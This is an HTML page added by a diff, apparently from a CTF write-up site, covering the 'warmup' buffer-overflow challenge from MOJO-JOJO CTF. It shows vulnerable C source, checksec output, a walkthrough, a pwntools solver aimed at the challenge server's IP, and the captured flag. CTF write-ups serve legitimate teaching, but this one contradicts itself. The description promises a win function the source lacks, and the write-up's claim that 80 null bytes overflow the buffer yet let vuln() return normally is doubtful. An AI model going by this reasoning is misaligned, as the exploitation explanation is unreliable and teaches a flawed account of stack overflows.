@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>warmup // Rogue_Net</title>
+    <meta name="description" content="## Warmup ## Description A beginner-friendly buffer overflow warmup. Smash the stack, overwrite the return address, and redirect execution to the win ">
+    <link rel="stylesheet" href="../../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>warmup<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>MOJO-JOJO CTF</span>
+                <span>0x468bfe2b</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                ## Warmup ## Description A beginner-friendly buffer overflow warmup. Smash the stack, overwrite the return address, and redirect execution to the win function. No protections, no tricks — just raw overflow.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// main.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void vuln() {
+    char buffer[64];
+    
+    printf(&#34;Welcome to the warmup challenge!\n&#34;);
+    printf(&#34;Enter your input: &#34;);
+    fflush(stdout);
+    
+    int n = read(0, buffer, 200);
+    
+    // Check that all bytes read are null (only check up to buffer size or n, whichever is smaller)
+    int check_size = (n &lt; 64) ? n : 64;
+    for (int i = 0; i &lt; check_size; i++) {
+        if (buffer[i] != 0) {
+            exit(1);
+        }
+    }
+    
+    printf(&#34;Good job!\n&#34;);
+}
+
+int main() {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    vuln();
+    system(&#34;cat flag.txt&#34;);
+    return 0;
+}</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Warmup — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Easy</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>r3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Null-Byte Buffer Overflow</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./main
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>No<span class="w"> </span>canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>No<span class="w"> </span>PIE<span class="w"> </span><span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></div>
+
+<p>The binary has <strong>no stack canary</strong> and <strong>no PIE</strong>, making it a straightforward stack-based challenge.</p>
+<h2>Source Code Analysis</h2>
+<p>The <code>vuln()</code> function allocates a 64-byte buffer but reads <strong>200 bytes</strong> — a classic buffer overflow:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="mi">200</span><span class="p">);</span>
+</code></pre></div>
+
+<p>However, there's a twist: the binary <strong>validates that all bytes in the buffer are null</strong> (<code>0x00</code>):</p>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">check_size</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>The key insight is that <code>check_size</code> is limited to <code>min(n, 64)</code> — it only checks the first 64 bytes. The overflow bytes beyond position 64 are <strong>never validated</strong>.</p>
+<p>After <code>vuln()</code> returns, <code>main()</code> calls <code>system("cat flag.txt")</code> — so we simply need <code>vuln()</code> to return normally.</p>
+<h2>Exploitation Strategy</h2>
+<ol>
+<li>Send 80 null bytes (<code>0x00 * 80</code>)</li>
+<li>The first 64 bytes pass the validation check</li>
+<li>The remaining 16 bytes overflow past the buffer but are all nulls</li>
+<li>Since <code>read()</code> doesn't need a newline, the null bytes don't terminate early</li>
+<li><code>vuln()</code> returns normally → <code>system("cat flag.txt")</code> executes</li>
+</ol>
+<h2>Exploit Code</h2>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">80</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;4.233.210.175&#39;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;input: &#39;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>python3<span class="w"> </span>solver.py
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Opening<span class="w"> </span>connection:<span class="w"> </span>Done
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Switching<span class="w"> </span>to<span class="w"> </span>interactive<span class="w"> </span>mode
+Good<span class="w"> </span>job!
+MOJO-JOJO<span class="o">{</span>w4rmup_n0_pr0bl3m<span class="o">}</span>
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
+
+payload = b&#39;\x00&#39; * 80
+print(f&#34;Payload length: {len(payload)}&#34;)
+print(f&#34;All bytes are null: {all(b == 0 for b in payload)}&#34;)
+
+#io = process(&#39;./main&#39;)
+io = remote(&#39;4.233.210.175&#39;,9001)
+io.recvuntil(b&#39;input: &#39;)  # Wait for prompt
+io.send(payload)
+time.sleep(0.1)  # Give it time to process
+io.interactive()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../../static/js/main.js"></script>
+</body>
+</html>
